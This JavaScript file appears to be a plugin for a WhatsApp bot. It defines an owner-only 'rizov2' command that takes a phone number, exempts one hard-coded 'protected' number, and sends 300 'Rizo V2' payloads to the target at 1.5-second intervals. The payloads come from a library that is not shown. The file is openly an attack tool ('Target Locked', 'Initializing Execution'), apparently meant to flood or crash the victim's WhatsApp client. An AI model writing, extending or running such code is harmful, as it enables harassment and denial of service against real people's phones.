let { sendRizoV2Payload, rizoSleep } = require('../lib/rizo-v2');

let handler = async (m, { conn, args, command, isCreator }) => {
    if (!isCreator) return m.reply('🔒 *Owner Only - Rizo Command!*');

    if (!args[0]) {
        return m.reply(`📌 *Usage:* .${command} 923xx`);
    }

    let pepec = (args[0] || "").replace(/[^0-9]/g, "");

    if (!pepec) {
        return m.reply('❌ *Invalid number format!*');
    }

    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
        return m.reply('🔒 *This number is protected by Rizo system!*');
    }

    let target = pepec + '@s.whatsapp.net';

    await m.reply(`🚀 *RIZO V2 Target Locked:* ${pepec}\n⚡ *Initializing Execution...*`);

    try {
        for (let i = 0; i < 300; i++) {
            await sendRizoV2Payload(conn, target);
            await rizoSleep(1500);
        }

        await conn.sendMessage(m.chat, { react: { text: "⚡", key: m.key } });
    } catch (error) {
        console.error(error);
        m.reply("⚠️ Error: Rizo V2 execution encountered an issue.");
    }
}

handler.command = ['rizov2', 'rizo-v2', 'rzv2'];
handler.tags = ['owner', 'rizo'];
handler.help = ['rizov2 923xx'];
module.exports = handler;
